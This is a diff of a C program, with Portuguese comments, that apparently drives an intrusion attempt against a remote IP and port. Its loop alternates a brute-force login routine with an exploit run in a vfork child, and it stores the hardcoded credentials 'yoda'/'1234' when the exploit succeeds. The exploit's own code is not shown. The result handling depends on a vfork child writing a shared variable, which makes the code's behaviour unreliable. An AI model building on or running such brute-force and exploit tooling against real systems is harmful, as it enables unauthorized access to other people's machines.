@@ -84,23 +84,30 @@ void main(int argc, char *argv[]){
     cont = 0;
     do{
         if( (random % 2 + cont++) == 1 ){
-            printf("Usando força bruta\n");
+            printf("\nUsando Força Bruta\n");
             
             success = bruteforce(lenKey, paramIPPort[0], username, pass);
         }
         else
         {
-            printf("Usando o exploit\n");
+            printf("Usando o Exploit\n");
             
             child = vfork();
             if(child == -1){
                 perror("");
             }else if(child == 0){
+                success = EXIT_FAILURE;
                 success = exploitMain(4, entryExploit);
                 _exit(23);
             }         
-            strcpy(username, "yoda");
-            strcpy(pass, "1234");
+            //o exploit foi alterado para que quando ele tem sucesso ele retorna 
+            //exit_success
+            //quando não tem sucesso ele termina com um exit
+            if(success == EXIT_SUCCESS){
+                strcpy(username, "yoda");
+                strcpy(pass, "1234");
+            }
+            else success = EXIT_FAILURE;
         }
         
     }while(success == EXIT_FAILURE && cont<2);
